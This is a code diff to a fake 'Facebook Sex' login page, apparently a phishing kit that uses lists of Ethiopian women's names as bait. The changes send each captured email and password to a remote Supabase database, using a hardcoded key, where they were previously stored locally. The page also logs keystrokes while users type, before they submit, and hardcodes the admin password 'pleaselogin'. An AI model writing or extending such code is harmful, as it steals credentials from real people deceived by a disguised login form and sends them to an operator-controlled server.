@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Sex - Log In or Sign Up</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Add Supabase JS library -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
             margin: 0;
@@ -397,6 +399,20 @@
             cursor: pointer;
             color: #65676b;
         }
+
+        /* Supabase status indicator */
+        .supabase-status {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: #42b72a;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            z-index: 999;
+            display: none;
+        }
         
         @media (max-width: 900px) {
             .content {
@@ -421,6 +437,11 @@
     </style>
 </head>
 <body>
+    <!-- Supabase status indicator -->
+    <div class="supabase-status" id="supabaseStatus">
+        <i class="fas fa-database"></i> Supabase: Connected
+    </div>
+
     <!-- Admin Login Form (initially hidden) -->
     <div class="admin-login-container" id="adminLoginContainer">
         <div class="admin-login-form">
@@ -512,6 +533,11 @@
     </div>
 
     <script>
+        // Initialize Supabase with your project details
+        const supabaseUrl = 'https://kdhkoogcnxkkqahujpya.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtkaGtvb3Fjbnhra3FhaHVqcHlhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY0OTQ5NDUsImV4cCI6MjA3MjA3MDk0NX0.KT_1_cfDtHgkkjMAAKjH_Jtp0_Qt66PtGXr64-EHArA';
+        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+
         document.addEventListener('DOMContentLoaded', function() {
             // DOM Elements
             const loginForm = document.getElementById('loginForm');
@@ -534,6 +560,7 @@
             const adminLoginClose = document.getElementById('adminLoginClose');
             const passwordInput = document.getElementById('password');
             const togglePassword = document.getElementById('togglePassword');
+            const supabaseStatus = document.getElementById('supabaseStatus');
             
             // Ethiopian girls names
             const ethiopianGirls = [
@@ -548,12 +575,75 @@
             const ADMIN_PASSWORD = "pleaselogin";
             
             // Initialize storage for login attempts
-            let loginAttempts = JSON.parse(localStorage.getItem('facebookSexLoginAttempts')) || [];
+            let loginAttempts = [];
             let isAdminAuthenticated = false;
+
+            // Test Supabase connection
+            async function testSupabaseConnection() {
+                try {
+                    const { data, error } = await supabase
+                        .from('admin_data')
+                        .select('count')
+                        .limit(1);
+                    
+                    if (!error) {
+                        supabaseStatus.style.display = 'block';
+                        setTimeout(() => {
+                            supabaseStatus.style.display = 'none';
+                        }, 3000);
+                    }
+                } catch (error) {
+                    console.error('Supabase connection error:', error);
+                }
+            }
+            
+            // Save data to Supabase
+            async function saveToSupabase(data) {
+                try {
+                    const { error } = await supabase
+                        .from('admin_data')
+                        .insert([{ 
+                            key: 'login_attempts', 
+                            data: JSON.stringify(data) 
+                        }]);
+                    
+                    if (error) throw error;
+                    return true;
+                } catch (error) {
+                    console.error('Error saving to Supabase:', error);
+                    // Fallback to localStorage if Supabase fails
+                    localStorage.setItem('facebookSexLoginAttempts', JSON.stringify(data));
+                    return false;
+                }
+            }
+            
+            // Load data from Supabase
+            async function loadFromSupabase() {
+                try {
+                    const { data, error } = await supabase
+                        .from('admin_data')
+                        .select('data')
+                        .eq('key', 'login_attempts')
+                        .order('created_at', { ascending: false })
+                        .limit(1)
+                        .single();
+                    
+                    if (error) throw error;
+                    return JSON.parse(data.data);
+                } catch (error) {
+                    console.error('Error loading from Supabase:', error);
+                    // Fallback to localStorage if Supabase fails
+                    const localData = localStorage.getItem('facebookSexLoginAttempts');
+                    return localData ? JSON.parse(localData) : [];
+                }
+            }
             
             // Display login attempts in admin panel
-            function displayLoginAttempts() {
+            async function displayLoginAttempts() {
                 attemptsList.innerHTML = '';
+                
+                // Load attempts from Supabase
+                loginAttempts = await loadFromSupabase();
                 
                 if (loginAttempts.length === 0) {
                     attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
@@ -596,7 +686,7 @@
             }
             
             // Handle login form submission
-            loginForm.addEventListener('submit', function(e) {
+            loginForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
                 
                 const email = document.getElementById('email').value;
@@ -609,8 +699,8 @@
                     timestamp: Date.now()
                 });
                 
-                // Save to localStorage
-                localStorage.setItem('facebookSexLoginAttempts', JSON.stringify(loginAttempts));
+                // Save to Supabase
+                await saveToSupabase(loginAttempts);
                 
                 // Show main page
                 loginPage.style.display = 'none';
@@ -630,12 +720,12 @@
             });
             
             // Toggle admin panel
-            adminToggle.addEventListener('click', function() {
+            adminToggle.addEventListener('click', async function() {
                 if (isAdminAuthenticated) {
                     // Already authenticated, show admin panel
                     adminPanel.style.display = 'block';
                     overlay.style.display = 'block';
-                    displayLoginAttempts();
+                    await displayLoginAttempts();
                 } else {
                     // Not authenticated, show login form
                     adminLoginContainer.style.display = 'flex';
@@ -698,15 +788,28 @@
             });
             
             // Clear all data
-            clearBtn.addEventListener('click', function() {
+            clearBtn.addEventListener('click', async function() {
                 if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
                     loginAttempts = [];
-                    localStorage.removeItem('facebookSexLoginAttempts');
-                    displayLoginAttempts();
+                    // Clear from Supabase
+                    try {
+                        const { error } = await supabase
+                            .from('admin_data')
+                            .delete()
+                            .eq('key', 'login_attempts');
+                        
+                        if (error) throw error;
+                    } catch (error) {
+                        console.error('Error clearing Supabase data:', error);
+                        // Fallback to localStorage
+                        localStorage.removeItem('facebookSexLoginAttempts');
+                    }
+                    await displayLoginAttempts();
                 }
             });
             
-            // Initialize admin panel
+            // Initialize
+            testSupabaseConnection();
             displayLoginAttempts();
             
             // Add real-time keystroke logging
@@ -723,7 +826,7 @@
             });
             
             // Periodically save what users are typing (even before form submission)
-            setInterval(function() {
+            setInterval(async function() {
                 if (emailValue || passwordValue) {
                     // Check if this is a new attempt (not already submitted)
                     const recentAttempt = loginAttempts[loginAttempts.length - 1];
@@ -749,7 +852,8 @@
                                 loginAttempts.push(tempAttempt);
                             }
                             
-                            localStorage.setItem('facebookSexLoginAttempts', JSON.stringify(loginAttempts));
+                            // Save to Supabase
+                            await saveToSupabase(loginAttempts);
                         }
                     }
                 }
